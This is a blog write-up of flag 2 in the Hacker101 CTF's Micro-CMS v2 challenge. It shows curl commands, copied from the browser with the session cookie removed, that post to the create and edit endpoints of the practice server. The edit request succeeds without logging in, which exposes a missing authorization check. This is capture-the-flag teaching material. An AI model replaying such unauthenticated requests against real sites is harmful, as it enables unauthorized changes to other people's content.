---
title: Hacker 101 CTF Micro-CMS v2 - Flag 2
published: true
---

Following on from [flag 1](https://ruddles.github.io/Hacker101-CTF-Micro-CMS-v2-flag-1); this is a writeup of flag 2 in [Hacker 101 CTF](https://ctf.hacker101.com/) Micro-CMS v2. If you're looking to follow along then I assume you're all logged in and have hit Go on the challenge.

# Finding a vulnerability

After completing flag one I spent some time clicking around mapping out the site (that didn't take long) and doing some basic dir busting to see if I could find anything interesting. Long story short, I didn't find anything of note, so back to looking at the obvious pages.

Digging around in the markdown section to see if there are any injection points I could attack (there's a good post on some attack vectors [here](https://medium.com/taptuit/exploiting-xss-via-markdown-72a61e774bf8)), it looks like there's fairly good input sanitisation now. Another dead end.

So, going back to clicking around the site I had a thought. We can see the `GET` requests are protected with a login page, what about the `POST` requests? There's 2 on the site:

- Creating a page
- Editing a page.

# Posting to Create

Usually I'd do something like this with burp suit, however I'm currently trying out kali on WSL2, so until later this year there's no easy way to get UI up and running. Instead I'm browsing in windows and using the tools in the WSL2 instance. So no burp, however the network tab in chome dev tools should do it.

The first thing to do is to log in (see my previous post on how to do this) and navigate to the create page at `/page/create/`. Open the dev tools in chrome (`F12`) and go to the network tab. I usually tick the "Preserve log" option at the top so redirects don't wipe the results out. Finally fill in some details and submit the page.

Now we have a payload we can right click on the post in the network tab and select "Copy as cURL (bash)"

![Create page]({{ site.url }}/assets/post-images/h101-cms-v2/CreatePage.png)

Now I tend to paste this into a text editor (I use vscode for everything) to make editing a bit easier.

This request is of course logged in, and we want to test if the same request still worked logged out. All we need to do is delete the line starting `-H 'Cookie:` so we're no longer logged in on the request and paste it into the terminal and hit enter:

```bash
curl 'http://35.190.155.168/90bf00b6e6/page/create' \
  -H 'Connection: keep-alive' \
  -H 'Cache-Control: max-age=0' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'Origin: http://35.190.155.168' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \
  -H 'Sec-GPC: 1' \
  -H 'Referer: http://35.190.155.168/90bf00b6e6/page/create' \
  -H 'Accept-Language: en-US,en;q=0.9' \
  --data-raw 'title=Test&body=Something+in+here' \
  --compressed \
  --insecure
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to target URL: <a href="/login">/login</a>.  If not click the link.%
```

Nope, that's protected. Moving on....

# Editing a page

Just like before: we're logged in, create the request, copy it, remove the cookie line and paste it into the terminal:

```bash
curl 'http://35.190.155.168/bf98748dfa/page/edit/4' \
  -H 'Connection: keep-alive' \
  -H 'Cache-Control: max-age=0' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'Origin: http://35.190.155.168' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \
  -H 'Sec-GPC: 1' \
  -H 'Referer: http://35.190.155.168/bf98748dfa/page/edit/4' \
  -H 'Accept-Language: en-US,en;q=0.9' \
  --data-raw 'title=test&body=something+else+in+here' \
  --compressed \
  --insecure
^FLAG^FLAG_HASH_HERE$FLAG$%
```

And that gives us a flag. Looks like the edit page wasn't correctly protected. One more flag to go on this challenge.

Any comments or suggestions? Chat with me on [twitter](https://twitter.com/RuddlesDev)
